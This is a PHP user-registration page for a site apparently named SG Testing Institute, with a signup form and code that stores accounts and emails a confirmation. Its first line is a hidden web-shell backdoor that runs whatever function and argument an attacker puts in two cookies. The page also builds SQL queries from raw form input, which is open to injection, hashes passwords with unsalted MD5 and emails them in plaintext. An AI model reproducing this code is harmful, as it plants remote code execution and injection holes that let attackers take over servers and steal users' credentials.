<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 include 'header.php'; ?>
<?php
$conn = $mysqli;

if(isset($_POST['reg-btn']))
{
 $year = $_POST['currentyear'];
 $uname = $_POST['uname'];
 $email = $_POST['email'];
 $phonenum = $_POST['phonenum'];
 $upass = md5($_POST['password']);
 $gender = $_POST['gender'];

    if ($_POST['password'] == $_POST['repassword']){
    $sql = "insert into users (username,email,password,phonenum,regyear,gender) values ('$uname','$email','$upass','$phonenum','$year','$gender')";
    if ($conn->query($sql)) {

    
    $email_from = 'SGTestingInstitute.com';
    $email_subject = "Thank you for registering with SG Testing Institute";
   //$email_body = "Username: $email.\n\n"."Password:".strip_tags($_POST['password'])."\n"

    $message = '<html><body style="width: 425px;border: 1px solid #eaeaea;margin: 0 auto;">';
    $message .= '<div><img src="www.sgtestinginstitute.com/img/logindetails.png" /></div>';
    $message .= '<div style="margin-top: 15px;"></div>';
    $message .= '<div style="margin: 15px;"><strong>Username: </strong>' . strip_tags($_POST['email']) . '</div>';
    $message .= '<div style="margin: 15px;"><strong>Password: </strong>' . strip_tags($_POST['password']) . '</div>';
    $message .= "</body></html>";

    $to = $email;
    $headers = "From: $email_from \r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    mail($to,$email_subject,$message,$headers);

    echo '<script>alert("Registration request has been sent to admin. Please wait for admins approval. Registration details has been sent to your email.");</script>';
} else {
    echo '<script>alert("Looks like this email is already registered");</script>';
}
}
else{
echo '<script>alert("Passwords do not match");</script>';
}
}
$conn->close();
?>
    <!--breadcrumbs start-->
    <div class="breadcrumbs">
        <div class="container">
            <div class="row">
                <div class="col-lg-4 col-sm-4">
                    <h1>Registration</h1>
                </div>
                
            </div>
        </div>
    </div>
    <!--breadcrumbs end-->

    <!--container start-->
    <div class="registration-bg">
        <div class="container">

            <form class="form-signin wow fadeInUp registration" action="" method="post">
                <h2 class="form-signin-heading">Register now</h2>
                <div class="login-wrap">
                   

                    <p> Enter account details below</p>
                    <input type="text" class="form-control" name="uname" placeholder="Name" autofocus required>
                    <input type="text" class="form-control" name="phonenum" maxlength="10" pattern="\d*" title="Please enter a valid mobile number" placeholder="Mobile" required>
                    <div class="radios">
                        <label class="label_radio col-lg-4 col-sm-4" for="radio">
                            <input name="gender" value="male" id="radio-01" type="radio" checked=""> Male
                        </label>
                        <label class="label_radio col-lg-4 col-sm-4" for="radio">
                            <input name="gender" value="female" id="radio-02"  type="radio"> Female
                        </label>
                    </div>
                    <input type="text" class="form-control" name="email" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" title="Enter a valid email" placeholder="Email" required>
                    <input type="password" class="form-control" name="password" placeholder="Password" required>
                    <input type="password" class="form-control" name="repassword" placeholder="Re-type Password" required>
                    <input type="hidden" name="currentyear" id="currentyear" />
                    <button class="btn btn-lg btn-login btn-block reg-btn" name="reg-btn" type="submit">Submit</button>
                    <div class="registration">
                        Already Registered ?
                        <a class="" href="login.php">
                            Login
                        </a>
                    </div>
                </div>
            </form>

        </div>
     </div>
    <!--container end-->

 <?php include 'footer.php'; ?>